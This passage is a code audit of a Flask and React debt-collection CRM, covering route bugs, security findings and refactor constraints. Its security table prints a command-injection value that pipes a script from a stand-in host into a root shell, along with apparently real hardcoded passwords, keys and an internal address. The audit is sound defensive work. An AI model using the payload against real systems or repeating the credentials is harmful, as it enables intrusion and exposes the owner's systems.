   `app.py:1786` (create user) and `app.py:1814` (password change). Werkzeug 2.3.7 (`requirements.txt`) only
   accepts `scrypt` or `pbkdf2:*`; anything else raises `ValueError("Invalid hash method 'sha256'.")`.
   *Scenario:* admin creates a user → `except` → `201 {"status": false}` → axios treats 201 as success →
   the UI shows no error and no user appears. Use `pbkdf2:sha256`.

2. **`update_user` KeyErrors when `password` is omitted.** `app.py:1813` reads `data['password']`
   unconditionally while every other field uses `'x' in data`. A PATCH-style payload without `password`
   → `KeyError` → rollback → 201.

3. **`for … else` misuse silently reports failure on success.** `app.py:2175-2181`
   (`update_type == "5"`): `for clint in clints: … else: errorMessages.append([…, "الحساب غير موجود"])`.
   Python's `for…else` runs whenever the loop finishes without `break`, so **every** row — including the
   ones that updated fine — gets an error appended, and the response always says
   `"تم تحديث N من اصل M"` with N too low.

4. **`latest_comments.comment_status_id` does not exist.** `app.py:3374` and `app.py:3657`.
   `latest_comments` is a `Subquery`; columns must be reached via `.c`, and `comment_status_id` was never
   selected (only `clint_id` and `latest_create_at`, 3319-3330 / 3604-3615).
   *Scenario:* filter the archive grid by حالة المتابعة → `AttributeError` → caught → `201` →
   the grid silently renders empty. This filter has never worked.

5. **"Latest comment" is actually an arbitrary comment.** `app.py:3410-3411` and `3694-3695` use
   `clint.comments[-1]`; the `Comments` relationship (491) has no `order_by`, so PostgreSQL returns rows in
   whatever order the plan produces. The archive grid can show a status from a comment written months ago.

6. **`/loginLog/user/<id>` returns the *oldest* 10 logins.** `app.py:1587`: `.limit(10).all()` is applied
   **before** the Python `sorted(..., reverse=True)` at 1593. Add `.order_by(LoginLog.timestamp.desc())`
   before `.limit(10)`.

7. **A promise-to-pay can never be set for today.** `app.py:5300`:
   `datetime.strptime(data['payment_date'], '%Y-%m-%d') < datetime.now()` compares today-at-midnight with
   now, so "today" is always rejected with "لا يمكن إضافة تاريخ سداد سابق". Compare `.date()` values.
   (Related: the whole file mixes tz-aware DB columns with naive `datetime.datetime.now()` — 5207, 5227,
   6802, 6928, 8067 uses `datetime.timezone.utc` while 6845/6886 use local `now().date()`.)

8. **`ArchivingStatus` is treated as a list but is a string.** `app.py:6224` and `6323`:
   `data.get('customeFilterArchivingStatusesValue[]', [])` returns a **str**; `ArchivingStatus != []` is then
   always true for any present value and `ArchivingStatus[0]` takes the **first character**
   (`"true"` → `"t"`). It works by accident because PostgreSQL coerces `'t'`/`'f'` to boolean — but an
   empty-string param raises `IndexError` → 201. Use `request.args.getlist(...)`.

9. **`sendNotification` can NameError.** `app.py:7179` iterates `selected_clients`, which is only assigned
   inside `if file_name is not None:` → `if os.path.exists(...)` → `try:` (7163-7177). Any missing file
   → `NameError` → 201 "حدث خطأ". Same shape at `app.py:5881` (`/clint/unarchivebyexcel` iterates
   `selected_clients` that may still be `None` → `TypeError`).

10. **`str(current_user)` stores a repr, not an id.** `app.py:7127`: `"create_by": str(current_user)` —
    `current_user` here is the Flask-JWT-Extended `LocalProxy` resolving to a `User`, whose `__repr__`
    (249) is `<User 'a@b.com'>`. The notification payload therefore stores `"<User 'x@y.com'>"`.

11. **`__repr__` returning a dict raises `TypeError`.** `PaymentDates` (715), `ArchiveReason` (772),
    `Portfolios` (791), `SepcifyUsers` (808), `CommentReachability` (822) all do `__repr__ = as_dict`.
    Any `repr()` — a debugger, a log line, an SQLAlchemy error message — raises
    `TypeError: __repr__ returned non-string`. Additionally `Supervisor.__repr__` (427),
    `SupervisorContract.__repr__` (449), `SupervisorUser.__repr__` (468) and `Comments.__repr__` (580)
    reference `self.name`, which those models do not have → `AttributeError`.

12. **`required_roles` reads the Flask cookie session while auth is JWT — it cannot work cross-origin.**
    `app.py:866-881` does `Role.query.get(session['user']['role_id'])`. `session['user']` is only ever set at
    login (1551). The frontend sends the JWT in an `Authorization` header (`CAWP-frontend/src/services/
    BaseService.ts`) and never sets `withCredentials`; `CORS(app, origins="*")` (195) does not enable
    `supports_credentials`, and a wildcard origin cannot carry credentials anyway. So the session cookie is
    never sent → `KeyError: 'user'` → uncaught → 500. Every `@required_roles(...)` in the file is commented
    out (2308, 2322, 2341, 2360, 2400, 2414, 2433, 5996, 6032, 6057, 6096) — presumably because of exactly
    this. **Net effect: there is no server-side permission enforcement at all**; the `permission` JSON is
    only used by the React UI to hide buttons.

13. **SuperAdmin cannot open a client detail page.** `app.py:3437-3443`: `getclint` branches only on
    "is there a `Supervisor` row for me"; a SuperAdmin without a supervisor row falls into
    `Clints.query.filter_by(id=id, user_id=current_user)` → `None` → "العميل غير موجود". This contradicts
    `_build_clints_payload`, which grants SuperAdmin full scope (2678, 2740).

14. **Missing `db.session.rollback()` after a failed commit.** These handlers catch the exception, return,
    and leave the session in a failed state that the next request on the same connection inherits:
    `getusers` 1683, `export_users` 1738, `getroles` 1881, `getnationalities` 1987, `getupdateSides` 2055,
    `updateClintByExcel` 2194 (after per-row commits), `getbranches` 2301, `getcontracts` 2391,
    `addUsers` 1370, `getPortfolios` 6265, `exportPortfolios` 6359, `createSupervisorContract`/
    `createSupervisorUsers` partial commits (6127/6150). Conversely, `getPortfolios`/`exportPortfolios`
    execute `portfolios_query.count()` **outside** the `try` (6271, 6365) so a DB error there is a raw 500.

15. **Routes that raise outside their `try`.** `getusers` calls `srverSideMode` at 1688 *after* the `except`
    block; `/roles` at 1886; `/nationalities` 1992; `/updateSides` 2060; `/contracts` 2395; `/comments` 4186;
    `/payments` 4652. `srverSideMode` sorts mixed types (`getKey` at 8334 returns `""` for a missing key but a
    `float`/`datetime` otherwise) → `TypeError: '<' not supported between 'str' and 'float'` → **uncaught 500**.

16. **`/dashbord/admin/dailyPaymentDates/v2` (6883) and `/notifications` (7189) have no `try/except`** —
    any DB hiccup is a bare 500 with a stack trace in the Sentry-less log.

17. **`Issable_db` `finally` can mask the real error.** `issable/db_connection.py:88, 135, 202, 250, 336`:
    `finally: if cur is not None:` — if `self.conn.cursor()` itself raised, `cur` was never bound →
    `UnboundLocalError` replaces the original exception. Also `GetSubscription` (44) and
    `GetCallsByDate` (94) return `None` (not `[]`) on error, so callers that iterate crash.

18. **Duplicated query executed twice per row.** `app.py:5348/5349`, `5394/5395`, `5441/5442`, `5493/5494` —
    the same `Comments.query.filter_by(...).order_by(...).first()` is written twice back to back.

19. **`comment_status` leaks across loop iterations.** `app.py:5352-5356` (and the three copies): the variable
    is only assigned when `comment is not None` but is read on the next iteration's guard. It is currently
    safe because the read is guarded by the same condition, but it is one edit away from serving row N-1's
    status to row N.

20. **`updateClintInRedis` drops the assignment/archive/user block for unassigned clients.**
    `app.py:7240`: `specifyUser`, `clintArchive` and `user` are only attached `if clint.user_id is not None`.
    A client with no collector gets a cached dict missing `user`/`specifyUser`, and every downstream
    `get_nested_value(client, "user.branch_id")` filter silently drops it.

21. **`check_client_lock` consumes the JSON body for GETs with a body and ignores non-`id` URL params.**
    `app.py:884-910`: it only looks at `kwargs['id']` and `data['clint_id']`. It is applied to
    `PUT /clints/<id>` (3474), `POST /comments` (3967), `POST /payment` (5158), `POST /payment_date` (5284)
    — but **not** to `/commentsbyexcel` (3987), `/clints/update/byexcel` (2114), `/sepcifyusers/ids` (6569) or
    `PUT /payment/<id>` (4872), so a locked client can still be modified through those paths.

22. **`/supervisor/<id>` PUT duplicates rows.** `app.py:6079-6086` inserts a `SupervisorContract`/
    `SupervisorUser` for **every** id in the payload without checking whether the link already exists
    (the delete loop above only removes links *not* in the payload). Saving the same supervisor twice
    doubles the join rows, which then double-counts in `/supervisors` and widens the `or_()` scope filter.

23. **`fetchClientsBySupervisor` crashes for a non-supervisor.** `app.py:8578-8584` dereferences
    `is_super.id` without a `None` check; reachable via `/clints/neglect/export` → `fetchClients` (8523)
    if `isSupervisor()` and the later lookup disagree.

24. **`getClintsBySupervisor` returns a Flask `Response` from a helper.** `app.py:8297-8299` returns
    `jsonify(...), 201` from inside a plain function whose callers treat the result as a list
    (`8583` → `fetchClients` → `exportServerSideMode`) → `TypeError` on iteration.

25. **`/clints/update/byexcel` has no `update_type == "3"` branch** (2128-2181). If the UI ever sends it,
    the request falls through to `len(errorMessages) == 0` → `200 {"status": true}` having done nothing.

26. **`getContactsByIdentityNumber` shadows its loop variable.** `app.py:4447` binds `contact`, then 4453
    rebinds it in the inner dedup loop. Harmless today, but the dedup is also O(n²).

27. **Error responses use `201`.** ~120 `return jsonify({... "status": False ...}), 201` sites. `201 Created`
    is a **2xx success**, so axios resolves the promise and the reducers write `payload.clints` (undefined)
    into the table. Users see an empty grid instead of an error. See §6.

---

## 4. Security findings

| # | Severity | Finding |
|---|---|---|
| S1 | **High** | **Command injection as root on the Asterisk box.** `app.py:2533` takes `recordingPath` straight from the query string → `Issable_db.download_call_recording` → `issable/db_connection.py:485` `ssh.exec_command(f"ls -lh {remote_file_path}")` and `:502` `cat {remote_file_path}`. `recordingPath=x; curl evil.sh \| sh` runs as **root** (`ssh.connect(..., username="root", password="Alitqan@1313")`, line 481). Any authenticated user can take over the telephony server. |
| S2 | **High** | **Hardcoded credentials in source.** `JWT_SECRET_KEY = "super-secret"` and `SECRET_KEY = "super-secret"` (`app.py:189-190`) — a public, guessable HMAC key means **anyone can forge a valid JWT for any user id**. Postgres URI with password `101016` (`app.py:193`). MySQL `crm/Admin123@123` (`db_connection.py:28-31`). SSH root password `Alitqan@1313` (`:481`) and key path `/root/.ssh/id_rsa` (`:390`). Also in `docker-compose.yml` and `server.sh`. `load_dotenv()` is called (185) but **no** `os.environ` lookup is ever used for these. |
| S3 | **High** | **48 of 159 routes have no `@jwt_required()`** (full list in §1, marked **none**). The worst: `GET /dashboard` (8921 — dumps all users, all contracts, all clients, all comments and all CDR), `GET /clints/have_payments` + `/clints/not_have_payments` and their exports (7278/7530/7562/7814 — **every client in the database, unscoped**), `DELETE /clints` (6541), `DELETE /clint/<id>` (6516), `DELETE /portfolios/<id>` (6426 — cascade-deletes a whole portfolio), `PUT /clint/archive/ids` (5924), `PUT /clint/archivebyexcel` (5810), `PUT /payment/<id>` (4872), `DELETE /comments/<id>` (4425), `POST /supervisor_user` (6137 — grants supervision scope), `POST /comment_status` (3905). |
| S4 | **High** | **No server-side authorization anywhere.** Every `@required_roles(...)` is commented out (§3.12) and the decorator is broken by design. The `permission` JSON (66-184) is enforced only in React. Any logged-in collector can call `POST /uesrs` (1778), `PUT /roles/<id>` (1922), `DELETE /supervisor/<id>` (6095), `PUT /payment/approve/<id>` (5185), etc. |
| S5 | **High** | **IDOR across clients.** `/clints/have_payments`, `/clints/not_have_payments` and their exports apply **no** `user_id`/supervisor scope (compare `_build_clints_payload` 2740-2782 and `/clints/neglect` 7912-7928, which do). Also `PUT /clints/<id>` (3472), `PUT /clints/delinquency/<id>` (3502), `GET /clints/user/<id>` (3524 — any collector can read any other collector's book), `GET /clint/document/<doc_id>/download` (5736) and `DELETE /clint/document/<doc_id>` (5759) (no ownership check on `doc_id`), `PUT /notifications/read/<id>` (7198 — no `receiver_user_id` check), `GET /loginLog/user/<id>` (1579), `GET /comments/clint/<id>` (4398), `GET /payments/clint/<id>` (5235). |
| S6 | **High** | **`pickle.loads` on Redis values.** `app.py:6925, 7540, 7824, 8176, 8229, 8290, 8564, 8574, 8592, 8937`. Redis is reachable at `10.10.10.240:6379` with **`password=None`** (`app.py:203`; `docker-compose.yml` exposes 6379 with no auth). Anyone who can write one key matching `clint*` gets **remote code execution in the API process**. Use JSON (`json` is already imported at line 30 and used 19×). |
| S7 | **Med-High** | **SQL injection into the Asterisk MySQL.** `db_connection.py:107` (`GetCallsByDate`), `:184` (`GetCallsFromCallCenter`), `:233` (`GetAllCallsFromCallCenter`), `:314` (`GetCallsByDateAbdListNumber`) build SQL with f-strings. `start_date`/`end_date` come unvalidated from `request.args` (`app.py:2508-2509`). The phone numbers are digit-filtered (`:164`, `:304`) so only the dates are injectable — still enough for `UNION SELECT`/data exfiltration from `asteriskcdrdb` and `call_center`. Use parameterized `%s` placeholders. |
| S8 | **Med** | **`debug=True` in production** (`app.py:9066`) → the Werkzeug interactive debugger is an RCE console if `PIN` protection is bypassed or disabled, plus full stack traces to clients. Also `app.run()` / `flask run` (Dockerfile) is the single-threaded dev server, and `socketIO.run()` is never used. |
| S9 | **Med** | **`CORS(app, origins="*")`** (195) and `cors_allowed_origins="*"` on SocketIO (204). With a forgeable JWT (S2) and no origin restriction, any website can drive the API on behalf of a victim who leaks a token. |
| S10 | **Med** | **JWT revocation is dead code.** `JWT_BLACKLIST_ENABLED = True` + `blacklist = set()` (855-858) but **no `@jwt.token_in_blocklist_loader`** is registered and `blacklist` is never referenced again. There is no logout endpoint. A stolen 24-hour token (191) cannot be revoked. An in-memory `set()` would also be per-worker and lost on restart. |
| S11 | **Med** | **Path traversal into `static/temp`.** `os.path.join(app.root_path, "static/temp", file_name)` with `file_name` straight from the query string/body: `app.py:2648, 3145, 3291, 3578, 4022, 5867, 7164`. `../../` escapes the directory; the file is then parsed by pandas and a chosen column is returned/acted on — an arbitrary-file read oracle for anything openpyxl/pandas can parse. Use `werkzeug.utils.secure_filename` and verify the resolved path stays under the temp dir. |
| S12 | **Med** | **Upload handling.** `/api/file/upload` (1139) and siblings do `request.files['file']` with **no key check** (`KeyError` → 500 before the `try`), no size limit (`MAX_CONTENT_LENGTH` is never set), and return the **absolute server path** in `excel_file` (1172) — path disclosure. `/clint/<id>/documents` (5657) is the good example: extension allow-list (5680), MIME allow-list (5683), 10 MB cap (5689), UUID-renamed storage (5695) — but it stores under `static/`, which is served by Flask, so `static/clint_documents/<uuid>.pdf` is readable **without a JWT** by anyone who learns the name. |
| S13 | **Med** | **Password hashing is weak/broken.** `method='sha256'` (1786, 1814) is invalid on Werkzeug 2.3 (§3.1); any user rows created under an older Werkzeug are **unsalted-ish single-round SHA-256**. `User.hash_password` (239) calls `.decode('utf8')` on a `str` → `AttributeError` (dead but misleading). |
| S14 | **Low-Med** | **Error responses leak internals.** ~120 sites return `"error": str(e)` — raw SQLAlchemy/psycopg messages including SQL fragments, table and column names, and constraint names, to any caller. |
| S15 | **Low-Med** | **`redis_obj.keys()` / `flushdb()` / `flushall()` / `shutdown()`** are exposed on the wrapper (`redis_cache/redis.py:23, 29, 32, 53`). Nothing calls the destructive ones, but `keys()` from a request handler is a DoS on shared Redis (see P1). |
| S16 | **Low** | **Login enumeration + no rate limiting.** `/login` (1525) is unauthenticated with no throttle, and `LoginLog` (824) records outcomes but nothing acts on them. Distinct outcomes ("user not found" vs "user not active") are logged, though the client-facing message is correctly generic. |
| S17 | **Low** | **Sentry is initialised with no DSN** (`app.py:46-60`, the `dsn=` line is commented out) while `traces_sample_rate=1.0` — so there is no error reporting at all, yet the app pays the instrumentation cost. |
| S18 | **Low** | **`session['user'] = user.as_dict()`** (1551) writes the full user row — including the **password hash** — into a client-side Flask cookie signed with the public `"super-secret"` key. Anyone with the cookie can read *and* forge it. |

---

## 5. Code-quality / structure notes

**Biggest duplicated blocks**
- `app.py:7282-7527` vs `app.py:7566-7811` — **246 lines, byte-for-byte identical** (verified with `diff`).
  The only difference is `HAVE_PAYMENTS = False` (7280) vs `True` (7564). Trivially collapsible into one
  helper taking a flag, exactly like `_build_clints_payload(export_mode=...)`.
- `app.py:3257-3428` (`/clients/archive/export`) vs `app.py:3540-3712` (`/clints/archive/`) — ~170 lines,
  identical except pagination. Same treatment.
- `app.py:4909-5025` vs `app.py:5027-5138` (`/payments/approval_status` ± `/export`) — ~110 lines identical.
- `app.py:6164-6290` vs `app.py:6294-6382` (`/portfolios` ± `/export`) — ~120 lines identical.
- The payment-date enrichment loop appears **4×**: 5344-5368, 5390-5414, 5437-5461, 5489-5513.
- The payment enrichment loop appears **3×**: 4668-4692, 4721-4745, 4815-4839.
- The comment enrichment loop appears **3×**: 4283-4308, 4343-4368, 9000-9025.
- The `col_map` + generic-filter block appears **5×**: 2804-2850, 2973-3010 (a literal copy inside the same
  function for the count query), 7431-7461, 7715-7745, 8009-8039.
- The pandas Excel-column read appears **7×**: 2645-2654, 3144-3155, 3290-3304, 3577-3591, 4020-4029,
  5866-5880, 7163-7177.
- The four upload routes 1139/1180/1221/1262 are ~40 near-identical lines each.
- Three copies of the MUI in-Python filter engine: `app.py:8367-8444` (`filterClints`),
  `app.py:8739-8816` (`filter_mui`), `classes/ServerSideDataHandler.py:37-114` (`filter_mui`).
- Two copies of the custom-filter engine: `customFilter` 8446-8479 vs `customFilter_user` 8843-8870.
- Two copies of the paging/sorting wrapper: `filterClients` 8597-8641 vs `pagination_filter_clients` 8643-8700.
- Three copies of `get_nested_value`: `app.py:8481`, `ServerSideDataHandler.py:115`, `FilterServerSide.py:136`.
- Two copies of `getKey`: `app.py:8334`, `ServerSideDataHandler.py:125`.

**Dead / broken code**
- `CAWP-API/models.py` — a bare `@app.route("/login")` at module scope referencing undefined `app`, `Users`,
  `jsonify`. Imports nothing, is imported by nothing. Delete.
- `classes/ServerSideDataHandler.py` — **never imported** (only `FilterServerSide` is, at `app.py:42`).
  It is also broken: `get_nested_value(client, field)` (115) and `getKey(key)` (125) are declared without
  `self`, so `self.get_nested_value(row, field)` (43) actually passes `self` as `client`; and
  `serverSideMode` (138) paginates `self.rows` (sorted) while returning `len(rowFiltered)` — so the page
  contents and the count disagree whenever a filter is active.
- `required_roles` (866) — every use is commented out; broken as written (§3.12).
- `blacklist` set (858) + `JWT_BLACKLIST_*` config (855-856) — no loader registered.
- Unused functions: `paginate` (8359), `countDays` (8491), `customFilter_user` (8843),
  `getdata` (1399), `User.hash_password` (239), `Issable_db.download_call_recording1` (371),
  `Issable_db.convert_to_Null` (22), `Model.as_josn` (defined on ~12 models, called 0 times).
- Unused imports: `compare_digest` (1), `itemgetter` (40), `redirect`/`url_for` (used once, line 927),
  `uuid` is used, `pickle` (15) should be replaced by the already-imported `json` (30).
- `app = Flask(__name__)` is executed **twice** (62 and 188); the first instance and the
  `defult_permission` dict attached before it are orphaned.
- `def not_found` is defined twice (1494 for 404, 1516 for 405) — the second shadows the module-level name.
- Dead local `rows_copy` (8819, 8831) and `ServerSideDataHandler.py:139`.
- `/clints/archive/` is registered **with a trailing slash** (3540) — Flask will 308-redirect
  `/clints/archive`; the frontend must keep the slash.

**Wire-API typos that MUST be preserved**
`clints` (path + response key), `uesrs` (`GET/POST /uesrs`, `PUT /uesrs/<id>`, `/uesrs/export` — note
`GET /users/<id>` is spelled correctly, so **both** spellings are live), `dashbord` (all `/dashbord/*`;
`/dashboard` is a different, separate route), `sepcify` (`SepcifyUsers`, `/sepcifyusers/ids`,
`/sepcifyusers/clint/<id>`, `/clint/SepcifyUsersByExcel`), `reson` (`/clints/archive/reson`,
`reson_archive` response key), `frist_name`, `portofolio` (`/clint/archive/portofolio/<id>`),
`clint`/`clints`/`clintArchive`/`clint_documents` table names, `customeFilter…` (not `custom…`),
`customeFilrerAccountNumberValue` (double typo, 3122), `commentsbyexcel`, `archivebyexcel`,
`unarchivebyexcel`, `CommentReachability_id` (capital C inside a snake-ish name),
`srverSideMode`, `as_josn`, `defult_permission`, `getdataasdict`, `headres`.

**What makes a refactor risky**
1. There is no test suite and no `tests/` directory anywhere in the repo.
2. `migrations/` is git-ignored (`.gitignore`), so the schema history is not in the repo — model changes
   cannot be reviewed against migrations.
3. The 201-on-error convention is load-bearing in an unusual way: the frontend does **not** treat 201 as an
   error, so "fix the status codes" is a breaking change (§6).
4. Model relationships overlap on the same FK (`Clints.comments` backref `clint` at 491 vs
   `Comments.clints` at 566; `Clints.users` at 494 vs `Comments.user` at 569). Adding `joinedload` or
   changing a `lazy=` can change which object a route sees.
5. `Clints.attribute` is free-form JSON populated from arbitrary Excel headers (`insertClints` 1467-1470);
   the sort at 2855 hardcodes the Arabic key `البروفجن`. Column names are data, not schema.
6. Business rules are enforced only in Python loops over `Payments` (4888, 5167, 5197, 5293, 8511) with no
   DB constraint, so any concurrent request can push total payments past `Clints.amount`.

---

## 6. Refactor safety checklist — what must not change

**Response envelopes (exact keys).** These are read directly by the React reducers
(`CAWP-frontend/src/views/**/store/listSlice.ts`, e.g. `state.tableData.total = action.payload.countRow`):

| Endpoint(s) | Must return |
|---|---|
| `/clints`, `/clints/neglect`, `/clints/have_payments`, `/clints/not_have_payments`, `/clints/currentUser/have_nextCalls`, `/clints/user/<id>` | `{"clints": [...], "countRow": n, "totalAmount": x}` (`/clints/user/<id>` omits `totalAmount`) |
| `/clints/archive/` | `{"clints_archive": [...], "countRow": n}` — **not** `clints` |
| `/clients/export`, `/clients/archive/export` | `{"clients": [...], "message": "...", "status": true}` — **`clients`, not `clints`** |
| `/clints/*/export` (neglect, have/not_have, have_nextCalls) | `{"clints": [...], "message": "...", "status": true}` |
| `/uesrs`, `/uesrs/export` | `{"users": [...], "countRow": n}` / `{"users": [...], "message", "status"}` |
| `/roles`, `/nationalities`, `/updateSides`, `/contracts`, `/portfolios` | `{"<plural>": [...], "countRow": n}` |
| `/branches`, `/clints/delinquency_reasons`, `/clint_contact_types`, `/comment_reachability`, `/collection_types`, `/contact_methods` | `{"<plural>": [...]}` — **no `countRow`** |
| `/clints/archive/reson` | `{"reson_archive": [...], "countRow": n}` (typo is the contract) |
| `/comments`, `/comments/current_user` | `{"comments": [...], "countRow": n}` (+`totalAmount` on `current_user`) |
| `/payments`, `/payments/user`, `/payments/approval_status` | `{"payments": [...], "countRow": n}` (+`totalAmount` except plain `/payments`) |
| `/payment_date`, `/payment_date/currentUser` | `{"payment_dates": [...], "countRow": n}` (+`totalAmount` on `currentUser`) |
| `/comment_status` | `{"comment_statuses": [...], "countRow": n}` |
| `/collection_methods` | `{"collection_methods": [...], "countRow": n}` |
| `/supervisors`, `/sepcifyusers/clint/<id>`, `/clint/<id>/documents` | `{"supervisors": [...]}` / `{"sepcifyusers": [...]}` / `{"documents": [...], "countRow": n}` |
| `/login`, `/refresh` | `{"access_token": "...", "status": true, "user": {...}}` where `user` carries nested `role` and `branch` |
| `/notifications` | a **bare JSON array**, not an object |
| single-entity GET/POST/PUT (`/users/<id>`, `/clints/<id>`, `/roles/<id>`, …) | the **bare object**, not wrapped |

**Nested row shape** — the grids read dotted paths (see `sort_map`, `app.py:2861-2901`). Each client row must
keep `portfolios{id,name,create_at,contract_id}`, `contract{id,name}`, `user{id,frist_name,last_name,name,branch_id}`
(or `null`), `comment{...}` (or `{"comment": null, "create_at": null}` when absent — **never `null`**),
`comment_status{name,color,is_active,CommentReachability_id}` (or `null`), `delinquencyReason{name}`,
`specifyUser{id,user_id,create_at,user{...}}`, `clintArchive{...}`. Note `user.name` is the concatenation
`frist_name + " " + last_name`, and the sort keys come in **both** `user.frist_name` and `user_.frist_name`
forms — `getKey` (8342-8343) strips a trailing `_`, so a SQL implementation must accept both.

**Query-param names:** the full table in §P12. Keep the per-endpoint `pageSize` defaults
(200 / 1000 / 10 / 100) — a grid that renders 200 rows today will change visibly if you normalise them.

**Status codes — the important one:**
- **Success is `200`.** `POST /clints/bulk-lock` etc. also return `200`, never `201`.
- **Errors currently return `201`** at ~120 sites, and `201` is a **success** status for axios.
  `BaseService.ts` only special-cases `401` (it dispatches `signOutSuccess`). So:
  - Changing `201 → 4xx/5xx` on error will make the frontend **reject** those promises for the first
    time — any screen that currently degrades to an empty grid will start throwing unhandled rejections.
    Do this deliberately, screen by screen, not as a global sed.
  - **Never** return `401` for a business error — it force-logs-out the user.
  - `404` is used for: `/clint/lock/<id>` not found (941), `/clint/unlock/<id>` (980),
    `/clint/lock-history/<id>` (1019), `/portfolios/<id>` DELETE (6431),
    `/clint/archive/portofolio/<id>` empty (6476), `/notifications/read/<id>` (7204).
  - `400` is used for: already-locked/unlocked (944, 983), empty `client_ids` (1053, 1101),
    missing dates on `/cdr_by_date` (2515).
  - `423 Locked` is returned by `check_client_lock` (907) and the frontend keys on it.
  - `500` is used by `/cdr_by_date` (2527), `/cdr/recording` (2564),
    `/clint/archive/portofolio/<id>` (6511), `/notifications/read/<id>` (7211).
- The export endpoints must keep `"status": true` **and** `"message": "تم تحميل الملف بنجاح"` in the body —
  the export components (`components/shared/myComponents/export*.tsx`) read `status` before building the file.

**Also preserve:** the trailing slash on `/clints/archive/`, the `Authorization: Bearer <token>` header
(the frontend never sends cookies, so do not move to session auth), and the SocketIO `join` event +
`alarm` event name and payload keys (`sender_user_id`, `client_id`, `accountNumber`, `message`, `type`, `id`).
